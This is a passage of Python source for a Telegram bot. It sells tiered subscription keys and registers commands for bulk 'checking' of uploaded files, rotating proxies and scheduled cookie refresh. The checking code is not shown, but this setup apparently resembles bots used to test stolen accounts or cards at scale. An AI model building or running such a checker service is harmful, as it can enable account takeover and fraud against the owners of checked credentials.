        await update.message.reply_text("Usage: /genkey <tier> <duration>d <quantity>\nExample: /genkey Gold 1d 5")
        logger.error("Invalid genkey format")
        return

    tier = args[0]
    duration = int(args[1][:-1])
    quantity = int(args[2])
    keys = []
    for _ in range(quantity):
        key = f"FN-B3-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
        keys_collection.insert_one({"key": key, "tier": tier, "duration_days": duration, "used": False})
        keys.append(key)

    response = (
        f"𝐆𝐢𝐟𝐭𝐜𝐨𝐝𝐞 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 ✅\n𝐀𝐦𝐨𝐮𝐧𝐭: {quantity}\n\n" +
        '\n'.join([f"➔ {key}\n𝐕𝐚𝐥𝐮𝐞: {tier} {duration} days" for key in keys]) +
        "\n\n𝐅𝐨𝐫 𝐑𝐞𝐝𝐞𝐦𝐩𝐭𝐢𝐨𝐧\n𝐓𝐲𝐩𝐞 /redeem {key}"
    )
    await update.message.reply_text(response)
    logger.info("200 OK: Keys generated")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Usage: /redeem <key>")
        logger.error("Invalid redeem format")
        return

    key = args[0]
    key_data = keys_collection.find_one({"key": key, "used": False})
    if not key_data:
        await update.message.reply_text("Invalid or used key.")
        logger.error("Invalid or used key")
        return

    user_id = update.effective_user.id
    expiration = datetime.utcnow() + timedelta(days=key_data["duration_days"])
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"tier": key_data["tier"], "expiration": expiration}},
        upsert=True,
    )
    keys_collection.update_one({"key": key}, {"$set": {"used": True}})

    await update.message.reply_text(
        f"""𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧 🎉

𝐘𝐨𝐮𝐫 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐈𝐬 𝐍𝐨𝐰 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ✅

𝐕𝐚𝐥𝐮𝐞: {key_data['tier']} {key_data['duration_days']} days

𝐓𝐡𝐚𝐧𝐤𝐘𝐨𝐮"""
    )
    logger.info("200 OK: Key redeemed")

async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can delete subscriptions.")
        logger.error("Unauthorized delkey attempt")
        return

    args = context.args
    if len(args) != 1 or not args[0].isdigit():
        await update.message.reply_text("Usage: /delkey <user_id>")
        logger.error("Invalid delkey format")
        return

    target_user_id = int(args[0])
    result = users_collection.delete_one({"user_id": target_user_id})
    if result.deleted_count:
        await update.message.reply_text(f"Subscription for user {target_user_id} deleted successfully.")
        logger.info(f"200 OK: Subscription deleted for user {target_user_id}")
    else:
        await update.message.reply_text(f"No subscription found for user {target_user_id}.")
        logger.info(f"No subscription found for user {target_user_id}")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    progress_collection.update_one({"user_id": user_id}, {"$set": {"stopped": True}})
    await update.message.reply_text("Checking stopped ❌")
    logger.info("200 OK: Stop command executed")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can broadcast messages.")
        logger.error("Unauthorized broadcast attempt")
        return

    message = " ".join(context.args)
    if not message:
        await update.message.reply_text("Please provide a message to broadcast.")
        logger.error("No broadcast message provided")
        return

    users = users_collection.find()
    for user in users:
        try:
            await context.bot.send_message(chat_id=user["user_id"], text=message, parse_mode="HTML")
        except:
            continue
    await update.message.reply_text("Broadcast sent successfully.")
    logger.info("200 OK: Broadcast sent")

def main():
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("chk", chk))
        application.add_handler(CommandHandler("genkey", genkey))
        application.add_handler(CommandHandler("redeem", redeem))
        application.add_handler(CommandHandler("delkey", delkey))
        application.add_handler(CommandHandler("stop", stop))
        application.add_handler(CommandHandler("broadcast", broadcast))
        application.add_handler(CommandHandler("updatecookies", update_cookies))
        application.add_handler(CommandHandler("addproxies", add_proxies))
        application.add_handler(MessageHandler(filters.Document.ALL, lambda u, c: handle_proxies_file(u, c) if c.user_data.get("awaiting_proxies", False) else handle_file(u, c)))
        application.add_handler(CallbackQueryHandler(button_callback))

        if application.job_queue is None:
            logger.error("JobQueue is not available. Please install python-telegram-bot with job-queue extra: pip install 'python-telegram-bot[job-queue]'")
            raise RuntimeError("JobQueue is not available. Cannot schedule cookie refresh.")
        application.job_queue.run_repeating(schedule_cookie_refresh, interval=COOKIE_REFRESH_INTERVAL, first=0)

        application.run_polling()
    except Exception as e:
        logger.error(f"Bot startup failed: {e}")
        raise

if __name__ == "__main__":
    main()